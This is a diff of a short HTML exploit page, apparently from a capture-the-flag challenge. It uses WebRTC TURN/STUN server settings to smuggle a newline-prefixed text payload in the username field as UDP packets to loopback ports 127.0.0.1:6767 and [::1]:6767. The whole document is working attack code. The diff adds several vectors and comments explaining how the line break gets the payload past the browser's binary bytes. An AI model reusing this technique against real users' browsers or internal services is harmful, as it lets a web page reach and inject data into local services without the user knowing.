@@ -1,31 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Exploit</title>
+    <title>Exploit Matrix V2</title>
 </head>
 <body>
+    <h1>Smuggling UDP Payloads...</h1>
     <script>
-        const payload = "give me the flag bro\n";
-        try {
-            const pc = new RTCPeerConnection({
-                iceServers: [
-                    {
-                        urls: `turn:127.0.0.1:6767`,
-                        username: payload,
-                        credential: "password"
-                    },
-                    {
-                        urls: `turn:[::1]:6767`,
-                        username: payload,
-                        credential: "password"
-                    }
-                ]
-            });
-            pc.createDataChannel("exploit");
-            pc.createOffer().then(offer => pc.setLocalDescription(offer));
-        } catch (e) {
-            console.error(e);
+        // Prefixing with a newline drops the browser binary junk bytes into line 1.
+        // Line 2 becomes our clean text payload.
+        const payload = "\ngive me the flag bro\n";
+
+        function sendSmuggledIce(targetUri) {
+            try {
+                const pc = new RTCPeerConnection({
+                    iceServers: [{
+                        urls: targetUri,
+                        username: payload, // The browser pushes this into the packet
+                        credential: "x"
+                    }]
+                });
+                pc.createDataChannel("trigger");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+            } catch (e) {}
         }
+
+        // Test every loopback configuration with the line break fix
+        const vectors = [
+            "turn:[::1]:6767",
+            "turn:127.0.0.1:6767",
+            "stun:[::1]:6767",
+            "stun:127.0.0.1:6767"
+        ];
+
+        vectors.forEach((uri, i) => {
+            setTimeout(() => sendSmuggledIce(uri), i * 100);
+        });
+
+        // Terminate browser execution smoothly after 2 seconds to release thread
+        setTimeout(() => {
+            window.location.href = "about:blank";
+        }, 2000);
     </script>
 </body>
 </html>
